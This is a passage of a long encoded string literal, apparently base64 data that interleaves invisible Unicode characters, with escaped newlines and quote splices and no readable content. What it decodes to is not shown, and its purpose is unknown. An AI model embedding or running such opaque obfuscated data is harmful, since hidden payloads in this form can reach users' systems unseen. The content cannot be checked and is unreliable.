ni+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KA\ni+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KA\ni+KAp+KAi+KAreKAi+KBuuKAi+KBvuKAi+KBpOKAi+KBv+KAi+KAsOKAi+KAo+KAi+KApeKAi+KAoeKA\ni+KAtOKAi+KAouKAi+KAreKAi+KBuuKAi+KBvuKAi+KBpOKAi+KBv+KAi+KAsOKAi+KAp+KAi+KBpeKA\ni+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKA\ni+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KAreKAi+KBuuKAi+KBvuKAi+KBpOKAi+KBv+KAi+KAsOKA\ni+KAo+KAi+KApeKAi+KAoeKAi+KAtOKAi+KAouKAi+KAreKAi+KArOKAi+KAp+KAi+KAq+KAi+KBueKA\ni+KBruKAi+KBuOKAi+KAuuKAi+KApeKAi+KBv+KAi+KBruKAi+KBs+KAi+KBv+KAi+KAouKAi+KApeKA\ni+KBrOKAi+KBueKAi+KBpOKAi+KBvuKAi+KBu+KAi+KAo+KAi+KAueKAi+KAouKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KBqOKAi+KBpOKAi+KBpOKAi+KBoOKAi+KBouKAi+KBruKAi+KBuOKA\ni+KAq+KAi+KAtuKAi+KAq+KAi+KBsOKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBlOKAi+KBlOKAi+KBg+KAi+KBpOKAi+KBuOKAi+KBv+KA\ni+KApuKAi+KBjOKAi+KBiuKAi+KBm+KAi+KBmOKAi+KArOKAi+KAseKAi+KAq+KAi+KBo+KAi+KBpOKA\ni+KBuOKAi+KBv+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBtuKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KBo+KAi+KBruKAi+KBquKAi+KBr+KAi+KBruKAi+KBueKAi+KBuOKA\ni+KAq+KAi+KAtuKAi+KAq+KAi+KBsOKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KA""q+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBquKAi+KBvuKAi+KBv+KAi+KBo+KAi+KBpOKAi+KBueKA\ni+KBouKAi+KBv+KAi+KBsuKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBquKAi+KBqOKAi+KBqOKA\ni+KBpOKAi+KBvuKAi+KBpeKAi+KBv+KAi+KBuOKAi+KApeKAi+KBrOKAi+KBpOKAi+KBpOKAi+KBrOKA\ni+KBp+KAi+KBruKAi+KApeKAi+KBqOKAi+KBpOKAi+KBpuKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBquKAi+KBqOKA\ni+KBqOKAi+KBruKAi+KBu+KAi+KBv+KAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KAoeKAi+KApOKA\ni+KAoeKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KArOKAi+KBquKAi+KBqOKAi+KBqOKAi+KBruKAi+KBu+KAi+KBv+KAi+KApuKA\ni+KBp+KAi+KBquKAi+KBpeKAi+KBrOKAi+KBvuKAi+KBquKAi+KBrOKAi+KBruKAi+KArOKAi+KAseKA\ni+KAq+KAi+KArOKAi+KBruKAi+KBpeKAi+KApuKAi+KBnuKAi+KBmOKAi+KAp+KAi+KBruKAi+KBpeKA\ni+KAsOKAi+KBuuKAi+KAtuKAi+KAu+KAi+KApeKAi+KAsuKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBqOKAi+KBpOKA\ni+KBpeKAi+KBv+KAi+KBruKAi+KBpeKAi+KBv+KAi+KApuKAi+KBv+KAi+KBsuKAi+KBu+KAi+KBruKA\ni+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBquKAi+KBu+KAi+KBu+KAi+KBp+KAi+KBouKAi+KBqOKA\ni+KBquKAi+KBv+KAi+KBouKAi+KBpOKAi+KBpeKAi+KApOKAi+KBs+KAi+KApuKAi+KBvOKAi+KBvOKA\ni+KBvOKAi+KApuKAi+KBreKAi+KBpOKAi+KBueKAi+KBpuKAi+KApuKAi+KBvuKAi+KBueKAi+KBp+KA\ni+KBruKAi+KBpeKAi+KBqOKAi+KBpOKAi+KBr+KAi+KBruKAi+KBr+KAi+KAsOKAi+KBqOKAi+KBo+KA\ni+KBquKAi+KBueKAi+KBuOKAi+KBruKAi+KBv+KAi+KAtuKAi+KBnuKAi+KBn+KAi+KBjeKAi+KApuKA\ni+KAs+KAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KArOKAi+KBrOKAi+KBpOKAi+KBpOKAi+KBrOKAi+KBp+KAi+KBruKAi+KA""puKA\ni+KBquKAi+KBqOKAi+KBqOKAi+KBpOKAi+KBvuKAi+KBpeKAi+KBv+KAi+KBuOKAi+KApuKAi+KBs+KA\ni+KBuOKAi+KBueKAi+KBreKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KAuuKAi+KArOKAi+KAp+KA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKA\ni+KBpOKAi+KBueKAi+KBouKAi+KBrOKAi+KBouKAi+KBpeKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKA\ni+KBo+KAi+KBv+KAi+KBv+KAi+KBu+KAi+KBuOKAi+KAseKAi+KApOKAi+KApOKAi+KBquKAi+KBqOKA\ni+KBqOKAi+KBpOKAi+KBvuKAi+KBpeKAi+KBv+KAi+KBuOKAi+KApeKAi+KBrOKAi+KBpOKAi+KBpOKA\ni+KBrOKAi+KBp+KAi+KBruKAi+KApeKAi+KBqOKAi+KBpOKAi+KBpuKAi+KArOKAi+KAp+KAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBueKA\ni+KBruKAi+KBreKAi+KBruKAi+KBueKAi+KBruKAi+KBueKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKA\ni+KBo+KAi+KBv+KAi+KBv+KAi+KBu+KAi+KBuOKAi+KAseKAi+KApOKAi+KApOKAi+KBquKAi+KBqOKA\ni+KBqOKAi+KBpOKAi+KBvuKAi+KBpeKAi+KBv+KAi+KBuOKAi+KApeKAi+KBrOKAi+KBpOKAi+KBpOKA\ni+KBrOKAi+KBp+KAi+KBruKAi+KApeKAi+KBqOKAi+KBpOKAi+KBpuKAi+KApOKAi+KBuOKAi+KBouKA\ni+KBrOKAi+KBpeKAi+KBvuKAi+KBu+KAi+KApOKAi+KBveKAi+KAueKAi+KApOKAi+KBqOKAi+KBueKA\ni+KBruKAi+KBquKAi+KBv+KAi+KBruKAi+KBquKAi+KBqOKAi+KBqOKAi+KBpOKAi+KBvuKAi+KBpeKA\ni+KBv+KAi+KAtOKAi+KBuOKAi+KBruKAi+KBueKAi+KBveKAi+KBouKAi+KBqOKAi+KBruKAi+KAtuKA\ni+KBpuKAi+KBquKAi+KBouKAi+KBp+KAi+KAreKAi+KBqOKAi+KBpOKAi+KBpeKAi+KBv+KAi+KBouKA\ni+KBpeKAi+KBvuKAi+KBruKAi+KAtuKAi+KBo+KAi+KBv+KAi+KBv+KAi+KBu+KAi+KBuOKAi+KAruKA\ni+KAuOKAi+KBiuKAi+KAruKAi+KAueKAi+KBjeKAi+KAruKAi+KAueKAi+KBjeKAi+KBpuKAi+KBquKA\ni+KBouKAi+KBp+KAi+KApeKAi+KBrOKAi+KBpOKAi+KBpOKAi+KBrOKAi+KBp+KAi+KBruKAi+KApeKA\ni+KBqOKAi+KBpOKAi+KBpuKAi+KAruKAi+KAueKAi+KBjeKAi+KBpuKAi+KBquKAi+KBouKAi+KBp+KA\ni+KAruKAi+KAueKAi+KBjeKAi+KBvuKAi+KAruKAi+KAueKAi+KBjeKAi+KAu+KAi+KAruKAi+KAueKA\ni+KBjeKAi+KAreKAi+KBv+KAi+KBo+KAi+KBruKAi+KBpuKAi+KBruKAi+KAtuKAi+KBpuKAi+KBpeKA\ni+KArOKAi+KAp+KAi+KAgeKAi+""KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KArOKAi+KBvuKAi+KBuOKAi+KBruKAi+KBueKAi+KApuKAi+KBquKAi+KBrOKAi+KBruKA\ni+KBpeKAi+KBv+KAi+KArOKAi+KAseKAi+KAq+KAi+KBrOKAi+KBrOKAi+KBqeKAi+KAo+KAi+KAouKA\ni+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBtuKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KBr+KAi+KBquKAi+KBv+KAi+KBquKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBsOKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKA\ni+KBreKAi+KApeKAi+KBueKAi+KBruKAi+KBuuKAi+KArOKAi+KAseKAi+KAq+KAi+KBreKAi+KArOKA\ni+KBkOKAi+KAqeKAi+KBsOKAi+KBv+KAi+KBpOKAi+KBoOKAi+KBtuKAi+KAqeKAi+KAp+KAi+KAqeKA\ni+KBsOKAi+KBpeKAi+KAuuKAi+KBtuKAi+KAqeKAi+KAp+KAi+KAqeKAi+KBsOKAi+KBpeKAi+KAueKA\ni+KBtuKAi+KAqeKAi+KAp+KAi+KAqeKAi+KBsOKAi+KBpeKAi+KAuuKAi+KBtuKAi+KAqeKAi+KAp+KA\ni+KAqeKAi+KBsOKAi+KBpeKAi+KAueKAi+KBtuKAi+KAqeKAi+KAp+KAi+KAu+KAi+KAp+KAi+KAu+KA\ni+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KA\ni+KAp+KAi+KAqeKAi+KBvOKAi+KBruKAi+KBqeKAi+KApuKAi+KBrOKAi+KBp+KAi+KBouKAi+KBreKA\ni+KApuKAi+KBuOKAi+KBouKAi+KBrOKAi+KBpeKAi+KBvuKAi+KBu+KAi+KAqeKAi+KAp+KAi+KAu+KA\ni+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KAuuKAi+KAp+KAi+KBkOKAi+KBluKA\ni+KAp+KAi+KAuuKAi+KBluKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBr+KAi+KBruKAi+KBveKAi+KBouKAi+KBqOKA\ni+KBruKAi+KBouKAi+KBpeKAi+KBreKAi+KBpOKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KBkOKA\ni+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KA\ni+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+""KBp+KAi+KBp+KAi+KAp+KA\ni+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KAqeKAi+KBheKAi+KBh+KAi+KAqeKAi+KAp+KA\ni+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KA\ni+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KAqeKAi+KBjOKAi+KBp+KAi+KBouKAi+KBreKA\ni+KBnOKAi+KBruKAi+KBqeKAi+KBmOKAi+KBouKAi+KBrOKAi+KBpeKAi+KBguKAi+KBpeKAi+KAqeKA\ni+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBkOKAi+KBluKAi+KAp+KAi+KBpeKA\ni+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKA\ni+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KAueKA\ni+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KAu+KAi+KAp+KAi+KAuuKAi+KAp+KA\ni+KAqeKAi+KAqeKAi+KAp+KAi+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KBpeKAi+KBvuKA\ni+KBp+KAi+KBp+KAi+KAp+KAi+KAueKAi+KAp+KAi+KAueKAi+KBluKAi+KArOKAi+KAp+KAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBtuKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBueKAi+KBruKAi+KBuOKAi+KBu+KAi+KBpOKAi+KBpeKAi+KBuOKAi+KBruKAi+KAq+KAi+KAtuKA\ni+KAq+KAi+KBueKAi+KBruKAi+KBuuKAi+KBvuKAi+KBruKAi+KBuOKAi+KBv+KAi+KBuOKAi+KApeKA\ni+KBu+KAi+KBpOKAi+KBuOKAi+KBv+KAi+KAo+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBo+KAi+KBv+KAi+KBv+KAi+KBu+KAi+KBuOKA\ni+KAseKAi+KApOKAi+KApOKAi+KBquKAi+KBqOKAi+KBqOKAi+KBpOKAi+KBvuKAi+KBpeKAi+KBv+KA\ni+KBuOKAi+KApeKAi+KBrOKAi+KBpOKAi+KBpOKAi+KBrOKAi+KBp+KAi+KBruKAi+KApeKAi+KBqOKA\ni+KBpOKAi+KBpuKAi+KApOKAi+KBlOKAi+KApOKAi+KBuOKAi+KBouKAi+KBrOKAi+KBpeKAi+KBvuKA\ni+KBu+KAi+KApOKAi+KBveKAi+KBquKAi+KBp+KAi+KBouKAi+KBr+KAi+KBquKAi+KBv+KAi+KBruKA\ni+KBu+KAi+KBruKAi+KBueKAi+KBuOKAi+KBpOKAi+KBpeKAi+KBquKAi+KBp+KAi+KBr+KAi+KBruKA\ni+KBv+KAi+KBquKAi+KBouKAi+KBp+KAi+KBuOKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKA""i+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBqOKAi+KBpOKAi+KBpOKAi+KBoOKA\ni+KBouKAi+KBruKAi+KBuOKAi+KAtuKAi+KBqOKAi+KBpOKAi+KBpOKAi+KBoOKAi+KBouKAi+KBruKA\ni+KBuOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KBo+KAi+KBruKAi+KBquKAi+KBr+KAi+KBruKAi+KBueKAi+KBuOKAi+KAtuKAi+KBo+KA\ni+KBruKAi+KBquKAi+KBr+KAi+KBruKAi+KBueKAi+KBuOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBr+KAi+KBquKAi+KBv+KAi+KBquKA\ni+KAtuKAi+KBr+KAi+KBquKAi+KBv+KAi+KBquKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBv+KAi+KBp+KAi+KAq+KA\ni+KAtuKAi+KAq+KAi+KBuOKAi+KBv+KAi+KBueKAi+KAo+KAi+KBueKAi+KBruKAi+KBuOKAi+KBu+KA\ni+KBpOKAi+KBpeKAi+KBuOKAi+KBruKAi+KApeKAi+KBv+KAi+KBruKAi+KBs+KAi+KBv+KAi+KAouKA\ni+KApeKAi+KBuOKAi+KBu+KAi+KBp+KAi+KBouKAi+KBv+KAi+KAo+KAi+KArOKAi+KAqeKAi+KAp+KA\ni+KBpeKAi+KBvuKAi+KBp+KAi+KBp+KAi+KAp+KAi+KAqeKAi+KArOKAi+KAouKAi+KBkOKAi+KAuuKA\ni+KBluKAi+KApeKAi+KBuOKAi+KBu+KAi+KBp+KAi+KBouKAi+KBv+KAi+KAo+KAi+KArOKAi+KAqeKA\ni+KArOKAi+KAouKAi+KBkOKAi+KAu+KAi+KBluKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBo+KAi+KBpOKAi+KBuOKAi+KBv+KAi+KAq+KAi+KAtuKAi+KAq+KAi+KBueKAi+KBruKAi+KBuOKA\ni+KBu+KAi+KBpOKAi+KBpeKAi+KBuOKAi+KBruKAi+KApeKAi+KBqOKAi+KBpOKAi+KBpOKAi+KBoOKA\ni+KBouKAi+KBruKAi+KBuOKAi+KApeKAi+KBrOKAi+KBruKAi+KBv+KAi+KBlOKAi+KBr+KAi+KBouKA\ni+KBqOKAi+KBv+KAi+KAo+KAi+KAouKAi+KBkOKAi+KArOKAi+KBlOKAi+KBlOKAi+KBg+KAi+KBpOKA\ni+KBuOKAi+KBv+KAi+KApuKAi+KBjOKAi+KBiuKA""i+KBm+KAi+KBmOKAi+KArOKAi+KBluKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBvOKAi+KBouKAi+KBv+KAi+KBo+KAi+KAq+KAi+KBpOKA\ni+KBu+KAi+KBruKAi+KBpeKAi+KAo+KAi+KArOKAi+KBv+KAi+KBp+KAi+KApeKAi+KBv+KAi+KBs+KA\ni+KBv+KAi+KArOKAi+KAp+KAi+KAq+KAi+KArOKAi+KBvOKAi+KArOKAi+KAp+KAi+KBruKAi+KBpeKA\ni+KBqOKAi+KBpOKAi+KBr+KAi+KBouKAi+KBpeKAi+KBrOKAi+KAtuKAi+KArOKAi+KBvuKAi+KBv+KA\ni+KBreKAi+KApuKAi+KAs+KAi+KArOKAi+KAouKAi+KAq+KAi+KBquKAi+KBuOKAi+KAq+KAi+KBreKA\ni+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KBreKAi+KApeKAi+KBvOKAi+KBueKAi+KBouKAi+KBv+KAi+KBruKAi+KAo+KAi+KBreKAi+KArOKA\ni+KBsOKAi+KBv+KAi+KBp+KAi+KBtuKAi+KApOKAi+KApOKAi+KBsOKAi+KBo+KAi+KBpOKAi+KBuOKA\ni+KBv+KAi+KBtuKAi+KBl+KAi+KBpeKAi+KArOKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBruKAi+KBs+KAi+KBqOKA\ni+KBruKAi+KBu+KAi+KBv+KAi+KAq+KAi+KBjuKAi+KBs+KAi+KBqOKAi+KBruKAi+KBu+KAi+KBv+KA\ni+KBouKAi+KBpOKAi+KBpeKAi+KAq+KAi+KBquKAi+KBuOKAi+KAq+KAi+KBruKAi+KAseKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBu+KAi+KBueKAi+KBouKAi+KBpeKAi+KBv+KAi+KAo+KA\ni+KBruKAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBv+KAi+KBp+KAi+KBp+KA\ni+KAo+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KBv+KA\ni+KBp+KAi+KBp+KAi+KAo+KAi+KAouKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KBr+KAi+KBruKA\ni+KBreKAi+KAq+KAi+KBueKAi+KBruKAi+KBuOKAi+KBv+KAi+KAo+KAi+KBvuKAi+KBuOKAi+KBruKA\ni+KBueKAi+KAouKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAq+KAi+KAq+KAi+KBv+KAi+KBueKAi+KBsuKAi+KAseKAi+KAgeKAi+KAgeKAi+KAgeKA""i+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KBo+KAi+KBruKAi+KBquKA\ni+KBr+KAi+KBruKAi+KBueKAi+KBuOKAi+KAq+KAi+KAtuKAi+KAq+KAi+KBsOKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKA\ni+KBk+KAi+KApuKAi+KBm+KAi+KBouKAi+KBrOKAi+KBruKAi+KBpOKAi+KBpeKAi+KApuKAi+KBmOKA\ni+KBruKAi+KBuOKAi+KBuOKAi+KBouKAi+KBpOKAi+KBpeKAi+KApuKAi+KBguKAi+KBr+KAi+KArOKA\ni+KAseKAi+KAq+KAi+KArOKAi+KAvuKAi+KAu+KAi+KBqOKAi+KBqOKAi+KAveKAi+KAs+KAi+KAveKA\ni+KAuuKAi+KApuKAi+KAvOKAi+KAu+KAi+KAuOKAi+KAveKAi+KApuKAi+KAv+KAi+KAuOKAi+KBqeKA\ni+KAv+KAi+KApuKAi+KAs+KAi+KAu+KAi+KAueKAi+KBruKAi+KApuKAi+KBreKAi+KBqeKAi+KAv+KA\ni+KAueKAi+KAs+KAi+KAueKAi+KAvOKAi+KAsuKAi+KAsuKAi+KBqOKAi+KAveKAi+KAu+KAi+KArOKA\ni+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KAq+KAi+KArOKAi+KBk+KAi+KApuKAi+KBm+KAi+KBouKAi+KBrOKAi+KBruKAi+KBpOKA\ni+KBpeKAi+KApuKAi+KBmeKAi+KBquKAi+KBvOKAi+KBqOKAi+KBp+KAi+KBouKAi+KBruKAi+KBpeKA\ni+KBv+KAi+KBv+KAi+KBouKAi+KBpuKAi+KBruKAi+KArOKAi+KAseKAi+KAq+KAi+KArOKAi+KAuuKA\ni+KAvOKAi+KAu+KAi+KAu+KAi+KAueKAi+KAvuKAi+KAuuKAi+KAvuKAi+KAvOKAi+KAv+KAi+KApeKA\ni+KAsuKAi+KAs+KAi+KAueKAi+KArOKAi+KAp+KAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKA\ni+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KAi+KAq+KAi+KArOKAi+KBk+KAi+KApuKAi+KBguKA\ni+KBjOKAi+KApuKAi+KBiOKAi+KBpOKAi+KBpeKAi+KBpeKAi+KBruKAi+KBqOKAi+KBv+KAi+KBouKA\ni+KBpOKAi+KBpeKAi+KApuKAi+KBmOKAi+KBu+KAi+KBruKAi+KBruKAi+KBr+KAi+KArOKAi+KAseKA\ni+KAq+KAi+KArOKAi+KApuKAi+KAuuKAi+KBoOKAi+KBqeKAi+KBu+KAi+KBuOKAi+KArOKAi+KAp+KA\ni+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAgeKAi+KAq+KAi+KAq+KAi+KAq+KA\ni+KAq+KAi+KArOKAi+KBk+KAi+KApuKAi+KBguKAi+KBjOKAi+KApuKAi+KBieKAi+KBquKAi+KBpeKA\ni+KBr